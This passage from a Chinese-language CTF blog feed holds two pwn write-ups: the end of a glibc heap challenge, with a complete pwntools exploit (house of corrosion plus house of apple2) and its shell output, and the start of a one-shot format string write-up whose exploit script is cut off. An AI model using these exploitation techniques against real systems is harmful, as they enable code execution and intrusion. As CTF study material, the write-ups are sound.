class="string">&quot;Done!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( idx == <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(buf);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Too many chunks!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>add 可以输入数据且有输出，且 size 范围较大，可以用来 leak</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD buf[<span class="number">6</span>]; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;As if nothing can be done, but it seems useful?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x28u</span>LL);</span><br><span class="line">  qword_202100 = buf[<span class="number">0</span>];</span><br><span class="line">  qword_202108 = buf[<span class="number">2</span>];</span><br><span class="line">  qword_202110 = buf[<span class="number">3</span>];</span><br><span class="line">  qword_202118 = buf[<span class="number">4</span>];</span><br><span class="line">  qword_202120 = buf[<span class="number">0</span>];</span><br><span class="line">  *(_QWORD *)buf[<span class="number">0</span>] = <span class="number">0xDEADBEEFCAFEBABEL</span>L;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并不能编辑，但是可以任意地址写一个大数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Content id:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">4</span> &amp;&amp; chunk_list[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)chunk_list[idx]);</span><br><span class="line">    chunk_list[idx] = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Delete is done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid id&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete ，无 uaf<br>有<code>exit</code>，直接打<code>house of corrosion</code> + <code>house of apple2</code>，exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.9/amd64/libc6_2.31-0ubuntu9.9_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *$rebase(0x93A)</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.9/amd64/libc6-dbg_2.31-0ubuntu9.9_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.31-0ubuntu9.9/amd64/glibc-source_2.31-0ubuntu9.9_all/usr/src/glibc/glibc-2.31</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">menu  = <span class="string">b&#x27;exit&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, data = <span class="string">b&#x27;deadbeef&#x27;</span></span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;length:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;data:&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;id:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">data</span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ex</span>():</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>) <span class="comment">#0 -&gt; unsortedbin</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment">#0</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;deadbeef&#x27;</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> - <span class="number">0x1ecb80</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base --&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment">#0 previous 0 -&gt; largebin</span></span><br><span class="line">add(<span class="number">0x500</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#2 previous 0</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x290</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base --&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">global_max_fast = libc_base + <span class="number">0x1eeea0</span></span><br><span class="line">fastbinsY = libc_base + <span class="number">0x1ecb80</span> + <span class="number">0x10</span></span><br><span class="line">offset = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>] - fastbinsY</span><br><span class="line">size = offset*<span class="number">2</span> + <span class="number">0x20</span></span><br><span class="line">log.info(<span class="string">&quot;size --&gt; &quot;</span>+<span class="built_in">hex</span>(size))</span><br><span class="line"></span><br><span class="line">chunk_addr = heap_base + <span class="number">0x290</span> + <span class="number">0x510</span>*<span class="number">2</span> + <span class="number">0x610</span> + <span class="number">0x510</span></span><br><span class="line">log.info(<span class="string">&quot;fake_io addr --&gt; &quot;</span>+<span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">io_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_IO_file = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">1</span>) + p64(<span class="number">2</span>)</span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0xa0</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x100</span>) <span class="comment">#wide_data</span></span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0xc0</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment">#mode</span></span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0xd8</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(io_wfile_jumps) <span class="comment">#vtable</span></span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0x100</span> - <span class="number">0x10</span> + <span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(chunk_addr + <span class="number">0x200</span>) <span class="comment">#_wide_data-&gt;_wide_vtable</span></span><br><span class="line">fake_IO_file = fake_IO_file.ljust(<span class="number">0x200</span> - <span class="number">0x10</span> + <span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(system) <span class="comment"># _wide_data-&gt;_wide_vtable-&gt;doallocate</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#3</span></span><br><span class="line">add(size - <span class="number">0x10</span>, fake_IO_file) <span class="comment">#4</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x508</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x500</span> + p32(<span class="number">0xfbadf7f5</span>) + <span class="string">b&#x27;;sh\x00&#x27;</span>) <span class="comment">#3 to edit fake_io -&gt; _flags</span></span><br><span class="line">edit(p64(global_max_fast)) </span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#io_list_all -&gt; fake_io</span></span><br><span class="line"></span><br><span class="line">ex()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">[DEBUG] Received 0x17 bytes:</span><br><span class="line">    00000000  73 68 3a 20  31 3a 20 f5  f7 ad fb 3a  20 6e 6f 74  │sh: │1: ·│···:│ not│</span><br><span class="line">    00000010  20 66 6f 75  6e 64 0a                               │ fou│nd·│</span><br><span class="line">    00000017</span><br><span class="line">sh: 1: \xf5\xf7\xad\xfb: not found</span><br><span class="line">$ whoami</span><br><span class="line">[DEBUG] Sent 0x7 bytes:</span><br><span class="line">    b&#x27;whoami\n&#x27;</span><br><span class="line">[DEBUG] Received 0x5 bytes:</span><br><span class="line">    b&#x27;r3t2\n&#x27;</span><br><span class="line">r3t2</span><br><span class="line">$</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> fastbin attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记栈上格式化字符串漏洞利用</title>
      <link href="/2025/09/13/%E8%AE%B0%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2025/09/13/%E8%AE%B0%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>上次仅仅有栈地址的低两字节，一次非栈上格式化字符串利用的比较极限的题打完，现在又碰到一个啥都不给的栈上格串题，但好在静态链接，有后门函数，分析一下<br>参考博客 <a href="https://bbs.kanxue.com/thread-281920.htm">https://bbs.kanxue.com/thread-281920.htm</a></p><h2 id="0x01-只有一次机会的栈上fmtstr"><a href="#0x01-只有一次机会的栈上fmtstr" class="headerlink" title="0x01 只有一次机会的栈上fmtstr"></a>0x01 只有一次机会的栈上fmtstr</h2><p>题目 ida 看一眼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init_0(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;one printf&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x60u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)buf, (<span class="type">unsigned</span> <span class="type">int</span>)buf, v3, v4, v5, v6, buf[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈上 <code>fmtstr</code> 漏洞，但只有一次，此题有后门函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">back_door</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是静态链接<br>我们查看一下 <code>printf</code> 栈帧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ rsp     0x7fffffffda68 —▸ 0x400c2a (main+84) ◂— mov eax, 0</span><br><span class="line">01:0008│ rdi rsi 0x7fffffffda70 ◂— &#x27;aaaaaaaa\n&#x27;</span><br><span class="line">02:0010│-068     0x7fffffffda78 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">03:0018│-060     0x7fffffffda80 ◂— 1</span><br><span class="line">04:0020│-058     0x7fffffffda88 —▸ 0x7fffffffdc08 —▸ 0x7fffffffdf09 ◂— &#x27;/home/r3t2/ctf/temp/fmtstr2/pwn_patched&#x27;</span><br><span class="line">05:0028│-050     0x7fffffffda90 —▸ 0x7fffffffdc18 —▸ 0x7fffffffdf31 ◂— &#x27;SHELL=/bin/bash&#x27;</span><br><span class="line">06:0030│-048     0x7fffffffda98 ◂— 2</span><br><span class="line">07:0038│-040     0x7fffffffdaa0 —▸ 0x6b7140 (__preinit_array_start) —▸ 0x400b30 (frame_dummy) ◂— mov eax, __register_frame_info</span><br><span class="line">08:0040│-038     0x7fffffffdaa8 —▸ 0x40199c (__libc_csu_init+124) ◂— add rbx, 1</span><br><span class="line">09:0048│-030     0x7fffffffdab0 —▸ 0x7fffffffdc08 —▸ 0x7fffffffdf09 ◂— &#x27;/home/r3t2/ctf/temp/fmtstr2/pwn_patched&#x27;</span><br><span class="line">0a:0050│-028     0x7fffffffdab8 —▸ 0x400400 (_init) ◂— sub rsp, 8</span><br><span class="line">0b:0058│-020     0x7fffffffdac0 —▸ 0x401920 (__libc_csu_init) ◂— push r15</span><br><span class="line">0c:0060│-018     0x7fffffffdac8 —▸ 0x4019c0 (__libc_csu_fini) ◂— push rbp</span><br><span class="line">0d:0068│-010     0x7fffffffdad0 ◂— 0</span><br><span class="line">0e:0070│-008     0x7fffffffdad8 ◂— 0x1f0cdfd354979e00</span><br><span class="line">0f:0078│ rbp     0x7fffffffdae0 —▸ 0x401920 (__libc_csu_init) ◂— push r15</span><br><span class="line">10:0080│+008     0x7fffffffdae8 —▸ 0x4011c9 (__libc_start_main+777) ◂— mov edi, eax</span><br><span class="line">11:0088│+010     0x7fffffffdaf0 ◂— 0</span><br><span class="line">12:0090│+018     0x7fffffffdaf8 ◂— 0x100000000</span><br><span class="line">13:0098│+020     0x7fffffffdb00 —▸ 0x7fffffffdc08 —▸ 0x7fffffffdf09 ◂— &#x27;/home/r3t2/ctf/temp/fmtstr2/pwn_patched&#x27;</span><br><span class="line">14:00a0│+028     0x7fffffffdb08 —▸ 0x400bd6 (main) ◂— push rbp</span><br><span class="line">15:00a8│+030     0x7fffffffdb10 ◂— 0</span><br><span class="line">16:00b0│+038     0x7fffffffdb18 ◂— 0x4400000019</span><br><span class="line">17:00b8│+040     0x7fffffffdb20 ◂— 0</span><br><span class="line">18:00c0│+048     0x7fffffffdb28 ◂— 0x100000040 /* &#x27;@&#x27; */</span><br><span class="line">19:00c8│+050     0x7fffffffdb30 ◂— 0</span><br><span class="line">... ↓            3 skipped</span><br><span class="line">1d:00e8│+070     0x7fffffffdb50 —▸ 0x400400 (_init) ◂— sub rsp, 8</span><br></pre></td></tr></table></figure><p>有后门函数，如果我们想改返回地址，就需要栈地址，然而我们只有一次机会（熟悉的感觉）<br>这时候注意到，栈上我们输入可以达到的地方，存在着一个栈地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">01:0008│ rdi rsi 0x7fffffffda70 ◂— &#x27;aaaaaaaa\n&#x27;</span><br><span class="line">02:0010│-068     0x7fffffffda78 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">03:0018│-060     0x7fffffffda80 ◂— 1</span><br><span class="line">04:0020│-058     0x7fffffffda88 —▸ 0x7fffffffdc08 —▸ 0x7fffffffdf09 ◂— &#x27;/home/r3t2/ctf/temp/fmtstr2/pwn_patched&#x27;</span><br><span class="line">05:0028│-050     0x7fffffffda90 —▸ 0x7fffffffdc18 —▸ 0x7fffffffdf31 ◂— &#x27;SHELL=/bin/bash&#x27;</span><br><span class="line">06:0030│-048     0x7fffffffda98 ◂— 2</span><br><span class="line">07:0038│-040     0x7fffffffdaa0 —▸ 0x6b7140 (__preinit_array_start) —▸ 0x400b30 (frame_dummy) ◂— mov eax, __register_frame_info</span><br><span class="line">08:0040│-038     0x7fffffffdaa8 —▸ 0x40199c (__libc_csu_init+124) ◂— add rbx, 1</span><br><span class="line">09:0048│-030     0x7fffffffdab0 —▸ 0x7fffffffdc08 —▸ 0x7fffffffdf09 ◂— &#x27;/home/r3t2/ctf/temp/fmtstr2/pwn_patched&#x27;</span><br></pre></td></tr></table></figure><p>在 <code>0x7fffffffdab0</code> 处，我们输入起始于 <code>0x7fffffffda70</code>，相差<code>0x40</code>，而我们可以输入<code>0x60</code>，也就是说，我们可以覆盖到这个栈地址，因为我们不知道栈地址，所以只好覆盖低字节来——爆破<br>这里存放的栈地址是<code>0x7fffffffdc08</code>，而<code>main</code>的返回地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0f:0078│ rbp     0x7fffffffdae0 —▸ 0x401920 (__libc_csu_init) ◂— push r15</span><br><span class="line">10:0080│+008     0x7fffffffdae8 —▸ 0x4011c9 (__libc_start_main+777) ◂— mov edi, eax</span><br></pre></td></tr></table></figure><p>位于<code>0x7fffffffdae8</code>，有<code>12bits</code>的差异，我们需要爆破两字节，修改返回地址为后门函数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6_2.35-0ubuntu3.10_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b printf</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6-dbg_2.35-0ubuntu3.10_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/glibc-source_2.35-0ubuntu3.10_all/usr/src/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400bc2</span></span><br><span 